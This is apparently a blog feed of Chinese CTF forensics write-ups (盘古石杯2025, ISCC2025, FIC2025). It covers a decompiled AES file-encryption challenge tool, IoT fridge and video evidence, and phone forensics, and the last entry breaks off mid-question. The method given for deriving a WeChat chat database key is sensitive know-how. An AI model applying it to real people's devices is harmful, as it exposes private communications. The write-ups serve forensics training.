aria-hidden="true">img</figcaption></figure><p>gui_wrapper.py中专门对一个模块的引入是否成功进行了检测</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747408811081-e6ede238-4ab6-411f-bae0-8782b55f7b76.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>将这个模块提取出来逆向</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747408290680-0285be66-44a1-4b5a-be42-1fdace3feb0d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用<a href="https://pylingual.io/">pylingual</a>反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: encrypt_deobfuscated.pyc</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.8.0rc1+ (3413)</span></span><br><span class="line"><span class="comment"># Source timestamp: 2025-04-17 01:58:27 UTC (1744855107)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> filedialog, messagebox</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EncryptionTool</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self._generate_key()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate_key</span>(<span class="params">self</span>):</span><br><span class="line">        seed_values = [(<span class="number">19</span>, <span class="number">7</span>, <span class="number">83</span>), (<span class="number">5</span>, <span class="number">31</span>, <span class="number">69</span>), (<span class="number">13</span>, <span class="number">11</span>, <span class="number">86</span>), (<span class="number">41</span>, <span class="number">3</span>, <span class="number">76</span>), (<span class="number">2</span>, <span class="number">57</span>, <span class="number">55</span>), (<span class="number">23</span>, <span class="number">5</span>, <span class="number">96</span>), (<span class="number">17</span>, <span class="number">13</span>, <span class="number">58</span>), (<span class="number">29</span>, <span class="number">7</span>, <span class="number">94</span>), (<span class="number">11</span>, <span class="number">19</span>, <span class="number">102</span>), (<span class="number">7</span>, <span class="number">17</span>, <span class="number">42</span>), (<span class="number">43</span>, <span class="number">3</span>, <span class="number">48</span>), (<span class="number">37</span>, <span class="number">11</span>, <span class="number">51</span>), (<span class="number">3</span>, <span class="number">43</span>, <span class="number">52</span>), (<span class="number">59</span>, <span class="number">7</span>, <span class="number">53</span>), (<span class="number">47</span>, <span class="number">5</span>, <span class="number">54</span>)]</span><br><span class="line">        key_parts = []</span><br><span class="line">        <span class="keyword">for</span> a, b, base <span class="keyword">in</span> seed_values:</span><br><span class="line">            val = (a * b % <span class="number">60</span> + base) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">if</span> val % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                val = (val + <span class="number">13</span>) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                val = (val + <span class="number">7</span>) % <span class="number">256</span></span><br><span class="line">            key_parts.append(<span class="built_in">chr</span>(val))</span><br><span class="line">        scrambled = []</span><br><span class="line">        indices = [<span class="number">3</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> indices:</span><br><span class="line">            scrambled.append(key_parts[idx])</span><br><span class="line">        raw_key = <span class="string">&#x27;&#x27;</span>.join(scrambled)</span><br><span class="line">        timestamp = <span class="built_in">int</span>(time.time()) % <span class="number">1000</span></span><br><span class="line">        random_val = random.randint(<span class="number">1</span>, <span class="number">255</span>)</span><br><span class="line">        entropy = <span class="built_in">chr</span>(timestamp % <span class="number">256</span>) + <span class="built_in">chr</span>(random_val)</span><br><span class="line">        temp_key = hashlib.sha256((raw_key + entropy).encode()).digest()</span><br><span class="line">        self._descramble_key(temp_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_descramble_key</span>(<span class="params">self, temp_key</span>):</span><br><span class="line">        mixed_base = <span class="string">b&#x27;&#x27;</span>.join([<span class="built_in">bytes</span>([b ^ <span class="number">42</span>]) <span class="keyword">for</span> b <span class="keyword">in</span> temp_key[:<span class="number">10</span>]])</span><br><span class="line">        actual_key = <span class="string">&#x27;SecureKey123456&#x27;</span></span><br><span class="line">        self.enhanced_key = self.enhance_key(actual_key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enhance_key</span>(<span class="params">self, key</span>):</span><br><span class="line">        round1 = self._add_salt(key)</span><br><span class="line">        round2 = self._ascii_transform(round1)</span><br><span class="line">        round3 = self._xor_transform(round2)</span><br><span class="line">        round4 = round3[::-<span class="number">1</span>]</span><br><span class="line">        final_key = hashlib.md5(round4.encode()).digest()</span><br><span class="line">        <span class="keyword">return</span> final_key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_add_salt</span>(<span class="params">self, key</span>):</span><br><span class="line">        salt_components = [<span class="string">&#x27;salt&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> key + <span class="string">&#x27;&#x27;</span>.join(salt_components)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_ascii_transform</span>(<span class="params">self, text</span>):</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">            ascii_val = <span class="built_in">ord</span>(text[i])</span><br><span class="line">            <span class="keyword">if</span> i % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>((ascii_val + <span class="number">7</span>) % <span class="number">256</span>)</span><br><span class="line">            <span class="keyword">elif</span> i % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>((ascii_val ^ <span class="number">15</span>) % <span class="number">256</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>(ascii_val * <span class="number">5</span> % <span class="number">256</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_xor_transform</span>(<span class="params">self, text</span>):</span><br><span class="line">        xor_keys = [<span class="string">&#x27;XorKey123456789&#x27;</span>, <span class="string">&#x27;AnotherKey987654&#x27;</span>]</span><br><span class="line">        result = text</span><br><span class="line">        <span class="keyword">for</span> xor_key <span class="keyword">in</span> xor_keys:</span><br><span class="line">            temp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">                temp += <span class="built_in">chr</span>(<span class="built_in">ord</span>(result[i]) ^ <span class="built_in">ord</span>(xor_key[i % <span class="built_in">len</span>(xor_key)]))</span><br><span class="line">            result = temp</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pad_data</span>(<span class="params">self, data</span>):</span><br><span class="line">        block_size = AES.block_size</span><br><span class="line">        padding_length = block_size - <span class="built_in">len</span>(data) % block_size</span><br><span class="line">        padding = <span class="built_in">bytes</span>([padding_length]) * padding_length</span><br><span class="line">        <span class="keyword">return</span> data + padding</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unpad_data</span>(<span class="params">self, data</span>):</span><br><span class="line">        padding_length = data[-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> data[:-padding_length]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt_file</span>(<span class="params">self, input_file, output_file=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> output_file:</span><br><span class="line">            output_file = input_file + <span class="string">&#x27;.enc&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cipher = AES.new(self.enhanced_key, AES.MODE_CBC)</span><br><span class="line">            iv = cipher.iv</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                file_data = f.read()</span><br><span class="line">            padded_data = self.pad_data(file_data)</span><br><span class="line">            encrypted_data = cipher.encrypt(padded_data)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(iv + encrypted_data)</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">True</span>, output_file)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, <span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EncryptionGUI</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, root</span>):</span><br><span class="line">        self.root = root</span><br><span class="line">        self.root.title(<span class="string">&#x27;File Encryption Tool&#x27;</span>)</span><br><span class="line">        self.root.geometry(<span class="string">&#x27;500x300&#x27;</span>)</span><br><span class="line">        self.root.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line">        self.encryptor = EncryptionTool()</span><br><span class="line">        self.setup_ui()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setup_ui</span>(<span class="params">self</span>):</span><br><span class="line">        file_frame = tk.Frame(self.root, pady=<span class="number">20</span>)</span><br><span class="line">        file_frame.pack(fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        tk.Label(file_frame, text=<span class="string">&#x27;Select File to Encrypt:&#x27;</span>).pack(side=<span class="string">&#x27;left&#x27;</span>, padx=<span class="number">10</span>)</span><br><span class="line">        self.file_path = tk.StringVar()</span><br><span class="line">        tk.Entry(file_frame, textvariable=self.file_path, width=<span class="number">30</span>).pack(side=<span class="string">&#x27;left&#x27;</span>, padx=<span class="number">5</span>)</span><br><span class="line">        tk.Button(file_frame, text=<span class="string">&#x27;Browse&#x27;</span>, command=self.browse_file).pack(side=<span class="string">&#x27;left&#x27;</span>, padx=<span class="number">5</span>)</span><br><span class="line">        action_frame = tk.Frame(self.root, pady=<span class="number">20</span>)</span><br><span class="line">        action_frame.pack()</span><br><span class="line">        tk.Button(action_frame, text=<span class="string">&#x27;Encrypt File&#x27;</span>, command=self.encrypt_file, bg=<span class="string">&#x27;#4CAF50&#x27;</span>, fg=<span class="string">&#x27;white&#x27;</span>, width=<span class="number">15</span>, height=<span class="number">2</span>).pack(pady=<span class="number">10</span>)</span><br><span class="line">        status_frame = tk.Frame(self.root, pady=<span class="number">10</span>)</span><br><span class="line">        status_frame.pack(fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">        self.status_var = tk.StringVar()</span><br><span class="line">        self.status_var.<span class="built_in">set</span>(<span class="string">&#x27;Ready&#x27;</span>)</span><br><span class="line">        tk.Label(status_frame, textvariable=self.status_var, bd=<span class="number">1</span>, relief=tk.SUNKEN, anchor=tk.W).pack(fill=<span class="string">&#x27;x&#x27;</span>, padx=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">browse_file</span>(<span class="params">self</span>):</span><br><span class="line">        filename = filedialog.askopenfilename(title=<span class="string">&#x27;Select File to Encrypt&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> filename:</span><br><span class="line">            self.file_path.<span class="built_in">set</span>(filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt_file</span>(<span class="params">self</span>):</span><br><span class="line">        file_path = self.file_path.get()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> file_path:</span><br><span class="line">            messagebox.showerror(<span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;Please select a file first!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.status_var.<span class="built_in">set</span>(<span class="string">&#x27;Encrypting...&#x27;</span>)</span><br><span class="line">        self.root.update()</span><br><span class="line">        success, result = self.encryptor.encrypt_file(file_path)</span><br><span class="line">        <span class="keyword">if</span> success:</span><br><span class="line">            self.status_var.<span class="built_in">set</span>(<span class="string">f&#x27;Encryption complete! Output: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">            messagebox.showinfo(<span class="string">&#x27;Success&#x27;</span>, <span class="string">f&#x27;File encrypted successfully!\nOutput: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.status_var.<span class="built_in">set</span>(<span class="string">f&#x27;Encryption failed: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">            messagebox.showerror(<span class="string">&#x27;Error&#x27;</span>, <span class="string">f&#x27;Encryption failed: <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    app = EncryptionGUI(root)</span><br><span class="line">    root.mainloop()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>42</p><h3 id="section-57">2</h3><p><strong>分析文件头部元素并确定它们的正确顺序。将字段名称按顺序连接并提交？</strong></p><p>由上题得</p><p>iv_encrypted_key</p><h3 id="section-58">3</h3><p><strong>密钥派生过程中使用了几个算法步骤。其中一个函数使用了与其实际功能不符的名称。找出这个函数名并提交？</strong></p><p>mixed_base变量并未用到</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747410712815-eb2bcadb-f71a-4ec1-a603-f5618272a9bb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>_descramble_key</p><h2 id="物联网取证">物联网取证</h2><h3 id="section-59">1</h3><p><strong>分析冰箱，请问智能冰箱的品牌？</strong></p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747412077483-08b957c7-1acc-462a-8994-2be88fc6b93e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Panasonic</p><h3 id="section-60">2</h3><p><strong>请问智能冰箱的型号？</strong></p><p>由上题</p><p>NR-E46CV1</p><h3 id="section-61">3</h3><p><strong>请找智能冰箱的uuid？</strong></p><p>大概就是上面第三行的东西吧</p><p>12345678-90AB-CDEF-1234-567890ABCDEF</p><h3 id="section-62">4</h3><p><strong>请问智能冰箱默认保存几张图片？</strong></p><p>可以发现每个保存图片的区域前都有一个face，搜索一下</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747412711034-d319e9e4-2e2d-482b-8e0d-b5100093209b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>5</p><h3 id="section-63">5</h3><p><strong>请问冰箱中已存的第一张图片上的内容是什么？</strong></p><p>将第一张图片提取出来</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747412891488-ec73925a-7ce9-4e52-9465-eb329fe52416.jpeg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>盘古石杯贾韦码</p><h3 id="section-64">6</h3><p><strong>请问冰箱中已存的第二张图片的名称是什么？</strong></p><p>由于在前面的题中知道了上题的图片叫face1.jpg，因此可得</p><p>face2.jpg</p><h3 id="section-65">7</h3><p><strong>请找冰箱中隐藏的内容？</strong></p><p>用一个strings命令即可查看到特殊字符串</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747414973424-27323abc-5751-422d-a0dd-7bf00cbf603b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>pangushicup</p><h3 id="section-66">8</h3><p><strong>请找出冰箱中嫌疑人图片MD5值的后六位？</strong></p><p>根据案情知嫌疑人是钟无声，因此是这张照片</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747415152415-5bcba515-93af-40e2-b6b2-3c3d1ae10120.jpeg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747415215804-11c1139d-3c09-4561-be13-74f04c2cf30e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>882564</p><h3 id="section-67">9</h3><p><strong>请找出冰箱最后一次开门时间？</strong></p><p>之前提取出来的enc文件中face1.jpg的修改时间即为冰箱最后一次开门时间。</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747415448819-6d511de8-43f0-45fc-8e89-1460e2d5aaa6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>15:48</p><h3 id="section-68">10</h3><p><strong>默认图片的存储限制大小是多少？</strong></p><p>查看前面第二题中face与face之间的间隔具体，即可知道存储限制大小</p><p>100KB</p><h3 id="section-69">11</h3><p><strong>分析video.E01，被修改的录像md5前5位是？</strong></p><p>可以发现存在问题的是20250415文件夹中的233549-00001-M.mp4，录像被往回跳了几秒。</p><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747416177214-a0c28a47-274c-4840-b548-495c1e659c15.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/盘古石杯2025初赛-Writeup-复现/1747416260123-9b5cd922-f652-4f3a-96c2-b0aa098d73c4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>ea7be</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> Forensics </tag>
            
            <tag> 盘古石杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2025 Writeup</title>
      <link href="/posts/dde87c/"/>
      <url>/posts/dde87c/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我们至今仍未知道ISCC主办方的心理，可以说是打过最烂的比赛了，没有之一</p><p>虽说有的史很难吃，但是有的题对于本菜狗来说还是能学到点东西的（</p></blockquote><h4 id="校赛writeup点我"><ahref="https://www.blog.st4rr.top/writeups/ISCC2025Writeup1.pdf">校赛Writeup点我</a></h4><h4 id="区域赛writeup点我"><ahref="https://www.blog.st4rr.top/writeups/ISCC2025Writeup2.pdf">区域赛Writeup点我</a></h4><h4 id="决赛writeup点我"><ahref="https://www.blog.st4rr.top/writeups/ISCC2025Writeup3.pdf">决赛Writeup点我</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> ISCC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FIC2025初赛 writeup+复现</title>
      <link href="/posts/24543801/"/>
      <url>/posts/24543801/</url>
      
        <content type="html"><![CDATA[<blockquote><p>混了个三等奖，三人赛有一人因为设备问题挂机了，两个人打有点吃力，不然也许能更好()</p><p>还是我太菜了(T0T)。</p><p>网页快照部分当时不是我看的，也完全没看，看起来也没什么意思，这里就不写wp和复现了。</p></blockquote><h2 id="手机取证">手机取证</h2><h3 id="section">1</h3><p><strong>请分析检材二，请分析"手机"检材，并回答，并回答该手机的device_name是？</strong></p><p>找settings_global.xml就行</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745841246627-498499e0-093f-49c7-b27c-4a85f36e280f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745841273226-f28c711e-f2fd-4509-8bb0-98a567494e98.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Redmi 6 Pro</p><h3 id="section-1">2</h3><p><strong>请分析检材二，请分析"手机"检材，并回答，嫌疑人pc开机密码是什么？</strong></p><p>翻一下备忘录的数据库<code>检材2.tar/data/com.bijoysingh.yang/databases</code>可以找到</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745845363223-298da38f-31b7-47fe-89a8-6973672a0c92.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>1qaz2wsx</p><h3 id="section-2">3</h3><p><strong>请分析检材二，请分析"手机"检材，并回答，嫌疑人接头暗号是什么？</strong>从上一题可以看出接头暗号是一张图片，在备忘录的文件中找到这张图片</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745845570412-ec63ce93-c2c3-4b92-9426-16c771be52ca.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>爱能不能够永远单纯没有悲哀</p><h3 id="section-3">4</h3><p><strong>请分析检材二，请分析"手机"检材，并回答，嫌疑人存放的秘钥环是多少？</strong>已经可以直接看到是在便签里，但没有直接显示出来</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745845941336-95e33dc0-97ab-4513-88bc-50fdaf9b4673.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>去便签的数据库检材2.tar/data/com.miui.notes/databases里面找一找</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745845997189-adae0af3-6e31-486b-ab8b-60ec62b9aeca.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>1qaz2wsx3edc</p><h3 id="section-4">5</h3><p><strong>请分析检材二，请分析"手机"检材，并回答，嫌疑人一生中最重要的日子是什么时候？</strong></p><p>手机中有一张截图</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745846603877-31fa08ce-9ae4-409c-978f-9bbec0da382c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>由此可算出是2026-02-06</p><h3 id="section-5">6</h3><p><strong>请分析检材三，请分析"手机"检材，并回答，嫌疑人微信生成的聊天记录数据库文件名称是什么？</strong></p><p>最近在做微信取证相关的项目，这题直接秒了</p><p>EnMicroMsg.db</p><h3 id="section-6">7</h3><p><strong>请分析检材二，请分析"手机"检材，并回答，嫌疑人微信账号对应的UIN 为多少？</strong> 可以直接读到uin</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745850601417-aa7f00c3-0ed6-4cd1-9745-f22d5a89f29f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>1864810197</p><h3 id="section-7">8</h3><p><strong>请分析检材二，请分析"手机"检材，并回答，嫌疑人微信聊天记录数据库的加密秘钥是什么？</strong></p><p>在uin前面加上1234567890ABCEDF再取md5值前7位就是密钥</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745850740075-4098228c-5fa6-4f61-b9ea-c263eca5dd25.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>31ad809</p><h3 id="section-8">9</h3><p><strong>请分析检材二，请分析"手机"检材，并回答，嫌疑人“欠条.rar”的解压密码是多少？</strong></p><p>密码是好友TCGG的手机号</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745850904818-1e9790e1-cdeb-49e1-9416-8221e317d637.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>手机号前面的聊天记录里有提到，看起来是个图片隐写</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745851161179-c6776cbf-d469-4f15-af0d-6e87dbc5a7d5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>找到一张带有二维码的图片</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745851204088-3f269019-5a13-4ddd-bdd2-84ef3d936fa5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>稍微处理一下扫出来就是手机号</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745851258365-431be507-7367-40df-852c-e8ba43e68fb8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745851333110-ed4ef711-ac64-4ce9-9e01-a479f9779fcb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>3170010703</p><h3 id="section-9">10</h3><p><strong>请分析检材二，请分析"手机"检材，并回答，嫌疑人“欠条.rar”解压后，其中VeraCrypt容器的MD5值是多少？</strong></p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745851434877-66fe304d-9fe1-4236-b597-9295c4f136a6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>83da62aabc88cb1b23e9469142b67b80</p><h3 id="section-10">11</h3><p><strong>请分析检材二，请分析"手机"检材，并回答，嫌疑人提供的“欠条.rar”解压后，其中"1.png"图上显示的VeraCrypt容器密码是多少？</strong></p><p>异或一下能看得更清楚</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745851708260-1d8b8c50-f412-4252-948f-48f78f4a2e7c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>#!<span class="citation"data-cites="KE2sax">@KE2sax</span>@!da0h5hghg34&amp;@</p><h3 id="section-11">12</h3><p><strong>请分析检材二，请分析"手机"检材，并回答，嫌疑人李某全名是什么？</strong></p><p>挂载一下欠条</p><figure><imgsrc="/images/FIC2025初赛-writeup-复现/1745851949069-88aa9d9e-c438-42c2-8b40-791038c4860d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>李安弘</p><h3 id="section-12">13</h3><p><strong>请分析检材二，请分析"手机"检材，并回答，嫌疑人欠款金额是多少？</strong></p><p>由欠条可得</p><p>80000</p><h2 id="介质取证">介质取证</h2><h3 id="section-13">1</h3><p><strong>请分析检材三，请分析"电脑"检材，并回答，该电脑最后一次开机时间是？</strong></p><p><strong>A. 